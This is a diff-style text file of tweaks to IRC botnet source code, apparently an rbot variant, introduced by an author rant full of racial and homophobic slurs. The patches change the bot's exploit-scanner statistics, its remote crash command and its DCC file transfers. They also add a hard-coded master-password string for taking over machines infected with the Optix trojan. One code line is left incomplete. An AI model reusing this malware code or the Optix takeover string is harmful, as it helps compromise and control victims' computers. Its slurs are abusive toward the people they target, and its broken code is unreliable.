@@ -1,0 +1,118 @@
+i must mention, not all my mods are here- sum were just too much of a 
+pain in the ass to add, or i didnt feel like it(  one consisted of about 85 minor changes to the bot :o  )
+~censored~ man, why arent sum other niggas releasing tweaks/fixes?-- actually i already know
+cuz most ~censored~ lamo's release a bot with a few crappy fixes, or fake it and try to trade
+ it for your first born child.
+those buncha faggots.
+   from reversepa
+ :)
+******************************************************************************************
+
+   void ListExploitStats(SOCKET sock, char *chan, BOOL notice)  //fixed noisey ass exploit stats, i mean wtf!?!?
+   {
+      char buffer[IRCLINE], buffer2[IRCLINE];
+      char rev[] =
+
+      int extotal = 0;
+
+      sprintf(buffer, "[SCAN] Exploit Stats:");
+      for(int i=0; exploit[i].port != 0; i++) {
+         if (exploit[i].stats > 0) {   //woot- stats output filter number 2 before number 1
+            extotal += exploit[i].stats;
+            sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
+            strncat(buffer, buffer2, sizeof(buffer));
+         }//yay
+      }
+      sprintf(buffer2, " Tot: %d in %s.", extotal, Uptime(started));
+      strncat(buffer, buffer2, sizeof(buffer));
+
+      if (extotal > 0) irc_privmsg(sock, chan, buffer, notice);  //if (extotal > 0) = dirty fix # 1 to quiet them down
+      addlog(buffer);
+
+      return;
+   }
+//   ^<--this    ends up replacing    this-->
+   /*
+   void ListExploitStats(SOCKET sock, char *chan, BOOL notice)
+   {
+      char buffer[IRCLINE], buffer2[IRCLINE];
+
+      int extotal = 0;
+
+      sprintf(buffer, "[SCAN]: Exploit Statistics:");
+      for(int i=0; exploit[i].port != 0; i++) {
+         extotal += exploit[i].stats;
+         sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
+         strncat(buffer, buffer2, sizeof(buffer));
+      }
+      sprintf(buffer2, " Total: %d in %s.", extotal, Uptime(started));
+      strncat(buffer, buffer2, sizeof(buffer));
+
+      irc_privmsg(sock, chan, buffer, notice);
+      addlog(buffer);
+
+      return;
+   }
+   */
+
+
+******************************************************************************************
+crash parameter bug- lol
+//too many parameters = message saying crash and they dont
+      #ifndef NO_CRASH
+      else if (strcmp(crash_cmnd[0], a[s]) == 0 || strcmp(crash_cmnd[1], a[s]) == 0) {
+//      else if (strcmp("crash", a[s]) == 0) {
+         if (a[s+5] == NULL) {//hehe, now will either not do anything due 2 excessive parameters- or really crash
+         
+            sprintf(sendbuf,"[MAIN] Crashing bot.");//it wont claim it is gonna crash then not do it
+            if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
+            addlog(sendbuf);
+            
+            strcmp(a[s+5],"crash"); // yes, this will crash- a pointer to null
+         }//added this logic -r3v
+//         else addlog("[CRASH] Excess parameters");
+         
+         return 1;
+      }
+      #endif
+//ought to replace this-->
+      #ifndef NO_CRASH
+      else if (strcmp("crash", a[s]) == 0) {
+         sprintf(sendbuf,"[MAIN]: Crashing bot.");
+         if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
+         addlog(sendbuf);
+            
+         strcmp(a[s+20],"crash"); // yes, this will crash.
+
+         return 1;
+      }
+      #endif
+******************************************************************************************
+dcc filename bug...
+->      sprintf(tmpfile,"%s%s",tmpfile,dcc.filename);
+   should be replaced
+   with ->      sprintf(tmpfile,"%s\\%s",tmpfile,dcc.filename);
+
+   it is in rbot.cpp, or dcc.cpp or
+   maybe even somewhere else, do a search all files, cuz it moved in sum mods
+******************************************************************************************
+optix add master password--- untested :o   untested :o - i think i peaked, not sure if i grabbed this outta a bot or it is the one i wrote a buncha days ago. i saw another bot with it after i did one-- anyhow, here it is
+
+      //do control-f and look for  auth  to find the spot
+   //Auth
+   //Note: OPTIX BLOCKS YA ASS UNTIL RESTART IF PASS IS WRONG 3TIMES :/
+   //this next block replaced the commented part
+      if (IS11 == TRUE)
+         sprintf(szBuffer, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.1\r\n"); //MASTERPASSWORD = 1.1 Server
+      else
+         sprintf(szBuffer, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.2\r\n"); //MASTERPASSWORD = 1.2 Server
+      fsend(opxsock, szBuffer, strlen(szBuffer), 0);
+      Sleep(500);
+   /*//old method, no master pass
+      if (IS11 == TRUE)
+         sprintf(szBuffer, "022¬OPtest¬v1.1\r\n"); //OPtest = Default Password, 1.1 Server
+      else
+         sprintf(szBuffer, "022¬OPtest¬v1.2\r\n"); //OPtest = Default Password, 1.2 Server
+      fsend(opxsock, szBuffer, strlen(szBuffer), 0);
+      Sleep(500);
+   */ 
